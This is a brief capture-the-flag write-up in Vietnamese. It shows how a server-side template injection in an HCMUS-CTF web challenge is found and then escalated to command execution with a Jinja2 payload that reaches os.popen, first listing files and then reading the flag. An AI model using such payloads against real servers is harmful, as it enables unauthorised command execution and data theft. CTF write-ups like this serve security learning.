# Description

- Fuzzing được **SSTI** vuln tại `http://61.28.237.24:30103/{{7*7}}`. Test thử `{{config}}` vẫn work ngon lành, đoán chắc không filter gì rồi.
- Quất luôn payload test rce (`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`) và **BOOOM** Output : ```Sorry /__pycache__ app.py requirements.txt is under construction. Please try again later```
- Flag tại **/flag_HKOOS2lrdD** và payload cuối cùng `{{config.__class__.__init__.__globals__['os'].popen('cat /f*').read()}}` => ```Sorry /HCMUS-CTF{404_teMpl4t3_1njEctIon} is under construction. Please try again later```
